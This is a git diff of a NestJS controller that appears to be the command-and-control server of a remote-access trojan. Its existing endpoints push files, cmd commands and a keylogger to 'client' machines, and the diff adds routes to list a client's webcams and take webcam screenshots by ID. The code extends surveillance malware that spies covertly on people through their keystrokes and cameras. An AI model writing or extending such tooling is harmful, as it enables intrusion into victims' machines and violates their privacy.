@@ -5,6 +5,7 @@ import {
   Param,
   Post,
   Query,
+  Req,
   UseGuards,
 } from "@nestjs/common";
 import { CONTROLLER_ROUTE } from "../route.constants";
@@ -15,12 +16,19 @@ import { ClientPermissionRepository } from "@/src/repository/db/clientPermisions
 import { ClientPermissionGuard } from "@/src/repository/db/clientPermisions/clientPermission.guard";
 import { SendKeyloggerToClientUseCase } from "../../application/events/send-keylogger.use-case";
 import {
+  CamerasControllerDto,
   GetFileDto,
   SendCmdCommandToClientDto,
   SendFileToClientDto,
   SendKeyloggerToClientDto,
 } from "./dto/controller.dto";
+import { ControllerAuthorizationGuard } from "../../application/guards/ControllerAuthorization.guard";
+import { CamerasUseCase } from "../../application/events/cameras.use-case";
+import { MessageBotGuard } from "../../application/guards/MessageBot.guard";
+import type { FastifyRequest } from "fastify";
 
+
+@UseGuards(ControllerAuthorizationGuard)
 @Controller(CONTROLLER_ROUTE)
 export class ControllerEvents {
   constructor(
@@ -28,7 +36,8 @@ export class ControllerEvents {
     private readonly getTasksUseCase: GetTasksUseCase,
     private readonly sendCmdToClientUseCase: SendCmdCommandToClientUseCase,
     private readonly sendKeyloggerToClientUseCase: SendKeyloggerToClientUseCase,
-  ) {}
+    private readonly camerasUseCase: CamerasUseCase,
+  ) { }
 
   @UseGuards(ClientPermissionGuard)
   @Post(":controllerid/upload-file")
@@ -73,5 +82,32 @@ export class ControllerEvents {
       controllerid,
       body.status,
     );
+  }
+
+  @UseGuards(ClientPermissionGuard, MessageBotGuard)
+  @Post(":controllerid/cameras")
+  async getCameras(
+    @Param("controllerid") controllerid: string,
+    @Body() body: CamerasControllerDto,
+    @Req() req: FastifyRequest
+  ) {
+
+
+    return await this.camerasUseCase.getCameras(controllerid, req.headers["identifier"] as string);
+
+  }
+
+  @UseGuards(ClientPermissionGuard)
+  @Get(":controllerid/camera-screenshot")
+  async getScreenshotWebcam(
+    @Param("controllerid") controllerid: string,
+    @Req() req: FastifyRequest,
+    @Query("webcamId") webcamId: string,
+
+  ) {
+
+    console.log("webcamId", webcamId);
+    return await this.camerasUseCase.takeScreenshot(controllerid, webcamId);
+
   }
 }
